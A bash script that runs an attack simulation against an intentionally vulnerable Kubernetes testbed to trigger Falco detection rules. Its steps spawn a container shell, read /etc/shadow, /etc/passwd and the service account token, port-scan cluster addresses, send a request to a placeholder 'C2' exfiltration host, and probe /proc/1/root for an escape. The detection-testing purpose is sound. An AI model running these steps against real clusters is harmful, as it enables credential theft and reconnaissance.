#!/usr/bin/env bash
# =============================================================================
# Automated Attack Simulation Script
# =============================================================================
# Purpose:
#   Runs all 4 attack scenarios against the vulnerable testbed containers
#   in sequence. Commands are designed to work on both Alpine-based (nginx,
#   redis) and Debian-slim (python) container images.
#
# Prerequisites:
#   1. Minikube cluster running with Calico CNI
#   2. Vulnerable testbed deployed (kubectl apply -f infrastructure/k8s/vulnerable-app/)
#   3. Falco running (Helm or direct manifests)
#   4. Terminal 1: Webhook server running (python response_engine/webhook_server.py)
#   5. Terminal 2: Log aggregator piping Falco logs to webhook
#
# Usage:
#   chmod +x scripts/run_attacks.sh
#   bash scripts/run_attacks.sh
# =============================================================================

set -euo pipefail

NAMESPACE="aiops-security"
DELAY=5  # seconds between attacks for clear log separation

# Colors for terminal output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

echo -e "${CYAN}============================================================${NC}"
echo -e "${CYAN} AIOps Threat Intelligence — Attack Simulation Script${NC}"
echo -e "${CYAN}============================================================${NC}"
echo ""

# ---------------------------------------------------------------------------
# Detect target pod (api-backend, python:3.11-slim based)
# ---------------------------------------------------------------------------
echo -e "${YELLOW}[*] Finding target pod (api-backend)...${NC}"
TARGET_POD=$(kubectl get pods -n "$NAMESPACE" -l component=api-backend -o jsonpath="{.items[0].metadata.name}" 2>/dev/null || true)

if [ -z "$TARGET_POD" ]; then
    echo -e "${RED}[!] No api-backend pod found. Trying app=vulnerable-testbed label...${NC}"
    TARGET_POD=$(kubectl get pods -n "$NAMESPACE" -l app=vulnerable-testbed -o jsonpath="{.items[0].metadata.name}" 2>/dev/null || true)
fi

if [ -z "$TARGET_POD" ]; then
    echo -e "${RED}[!] ERROR: No target pod found in namespace '$NAMESPACE'.${NC}"
    echo "    Ensure vulnerable testbed is deployed:"
    echo "    kubectl apply -f infrastructure/k8s/vulnerable-app/"
    exit 1
fi

echo -e "${GREEN}[+] Target pod: $TARGET_POD${NC}"
echo ""

# ---------------------------------------------------------------------------
# Attack 1: Unauthorized Interactive Shell (T1609)
# ---------------------------------------------------------------------------
echo -e "${RED}🚨 ATTACK 1: Shell Spawned in Container (T1609)${NC}"
echo -e "   Spawning /bin/sh inside $TARGET_POD..."
# Non-interactive exec to trigger Falco's shell detection rule
kubectl exec "$TARGET_POD" -n "$NAMESPACE" -- /bin/sh -c "echo 'Shell access gained — T1609 Container Administration Command'" 2>/dev/null || true
echo -e "${GREEN}   ✓ Shell command executed. Falco should detect: 'Shell Spawned in Container'${NC}"
echo ""
sleep "$DELAY"

# ---------------------------------------------------------------------------
# Attack 2: Sensitive Credential Access (T1552.001)
# ---------------------------------------------------------------------------
echo -e "${RED}🚨 ATTACK 2: Sensitive File Read (T1552.001)${NC}"

echo -e "   Reading /etc/passwd..."
kubectl exec "$TARGET_POD" -n "$NAMESPACE" -- cat /etc/passwd > /dev/null 2>&1 || true

echo -e "   Reading Kubernetes service account token..."
kubectl exec "$TARGET_POD" -n "$NAMESPACE" -- cat /var/run/secrets/kubernetes.io/serviceaccount/token > /dev/null 2>&1 || true

echo -e "   Reading /etc/shadow (may fail on slim images)..."
kubectl exec "$TARGET_POD" -n "$NAMESPACE" -- cat /etc/shadow > /dev/null 2>&1 || true

echo -e "${GREEN}   ✓ Credential access attempted. Falco should detect: 'Sensitive File Read in Container'${NC}"
echo ""
sleep "$DELAY"

# ---------------------------------------------------------------------------
# Attack 3: Network Discovery / Port Scanning (T1046)
# ---------------------------------------------------------------------------
echo -e "${RED}🚨 ATTACK 3: Network Service Discovery (T1046)${NC}"
echo -e "   Scanning internal network using Python (available in api-backend)..."

# Use Python's built-in socket library instead of nmap (works on all images)
kubectl exec "$TARGET_POD" -n "$NAMESPACE" -- python3 -c "
import socket
targets = ['10.244.0.1', '10.96.0.1', '10.96.0.10']
ports = [80, 443, 8080, 6379, 53]
for ip in targets:
    for port in ports:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            s.connect((ip, port))
            print(f'OPEN: {ip}:{port}')
            s.close()
        except:
            pass
print('Network scan complete')
" 2>/dev/null || true

echo -e "${GREEN}   ✓ Network scan executed. Falco should detect: 'Unexpected Outbound Connection'${NC}"
echo ""
sleep "$DELAY"

# ---------------------------------------------------------------------------
# Attack 4: Suspicious Outbound Connection / Exfiltration (T1041)
# ---------------------------------------------------------------------------
echo -e "${RED}🚨 ATTACK 4: Suspicious Outbound Connection (T1041)${NC}"
echo -e "   Attempting connection to external C2 address..."

# Use Python's urllib instead of curl (available in python:3.11-slim)
kubectl exec "$TARGET_POD" -n "$NAMESPACE" -- python3 -c "
import urllib.request
try:
    req = urllib.request.Request('http://203.0.113.10:9999/exfil_data')
    urllib.request.urlopen(req, timeout=2)
except Exception as e:
    print(f'Connection attempt (expected to fail): {e}')
" 2>/dev/null || true

echo -e "${GREEN}   ✓ Exfiltration attempt executed. Falco should detect: 'Unexpected Outbound Connection'${NC}"
echo ""
sleep "$DELAY"

# ---------------------------------------------------------------------------
# Attack 5 (Bonus): Process namespace manipulation (T1611)
# ---------------------------------------------------------------------------
echo -e "${RED}🚨 ATTACK 5: Container Escape Probe (T1611)${NC}"
echo -e "   Probing /proc/1/root (host process namespace)..."

kubectl exec "$TARGET_POD" -n "$NAMESPACE" -- /bin/sh -c "ls /proc/1/root/ 2>/dev/null || echo 'Access denied (expected)'" 2>/dev/null || true

echo -e "${GREEN}   ✓ Escape probe executed. Falco should detect: 'Container Escape via Procfs'${NC}"
echo ""

# ---------------------------------------------------------------------------
# Summary
# ---------------------------------------------------------------------------
echo -e "${CYAN}============================================================${NC}"
echo -e "${CYAN} Attack Simulation Complete${NC}"
echo -e "${CYAN}============================================================${NC}"
echo ""
echo -e "  ${YELLOW}5 attack scenarios executed against: $TARGET_POD${NC}"
echo ""
echo -e "  ${GREEN}Expected Falco alerts:${NC}"
echo "    1. Shell Spawned in Container (AIOps)       — T1609"
echo "    2. Sensitive File Read in Container (AIOps)  — T1552.001"
echo "    3. Unexpected Outbound Connection (AIOps)    — T1046"
echo "    4. Unexpected Outbound Connection (AIOps)    — T1041"
echo "    5. Container Escape via Procfs (AIOps)       — T1611"
echo ""
echo -e "  ${YELLOW}Check results:${NC}"
echo "    • Webhook server terminal for ML inference logs"
echo "    • Dashboard at http://localhost:3333 for live alerts"
echo "    • datasets/falco/processed/runtime_alerts.jsonl for persisted alerts"
echo "    • datasets/falco/raw/ for raw Falco event archival"
echo ""
echo -e "  ${YELLOW}Verify NetworkPolicies:${NC}"
echo "    kubectl get networkpolicy -n $NAMESPACE"
echo ""
